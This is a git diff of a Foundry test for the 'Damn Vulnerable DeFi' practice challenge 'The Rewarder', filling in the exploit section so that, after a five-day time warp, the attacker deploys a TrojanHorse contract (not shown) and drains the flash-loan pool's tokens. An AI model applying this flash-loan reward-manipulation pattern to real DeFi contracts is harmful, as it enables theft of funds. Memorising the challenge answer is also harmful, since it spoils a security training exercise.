@@ -3,12 +3,13 @@ pragma solidity >=0.8.0;
 
 import {Utilities} from "../../utils/Utilities.sol";
 import "forge-std/Test.sol";
-
+ 
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPool.sol";
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+import {TrojanHorse} from "../../../src/Contracts/the-rewarder/TrojanHorse.sol";
 
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
@@ -89,6 +90,12 @@ contract TheRewarder is Test {
          * EXPLOIT START *
          */
 
+        vm.warp(block.timestamp + 5 days);
+        vm.startPrank(attacker);
+        TrojanHorse trojan = new TrojanHorse(address(flashLoanerPool), address(theRewarderPool), address(theRewarderPool.rewardToken()), address(dvt));
+        trojan.attack(dvt.balanceOf(address(flashLoanerPool)));
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
@@ -116,5 +123,6 @@ contract TheRewarder is Test {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+        console.log("%s", "gets to the last assertion");
     }
 }
